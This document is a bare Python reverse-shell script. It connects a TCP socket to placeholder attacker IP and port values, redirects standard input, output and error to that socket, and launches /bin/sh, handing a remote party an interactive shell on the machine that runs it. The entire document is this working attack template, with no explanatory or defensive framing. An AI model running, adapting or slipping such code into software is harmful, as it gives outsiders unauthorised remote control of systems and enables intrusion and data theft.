import os
import socket
import sys

IP = <ATTACKER_IP>
PORT = <ATTACKER_PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

os.dup2(s.fileno(),sys.stdin.fileno())
os.dup2(s.fileno(),sys.stdout.fileno())
os.dup2(s.fileno(),sys.stderr.fileno())

os.system("/bin/sh")
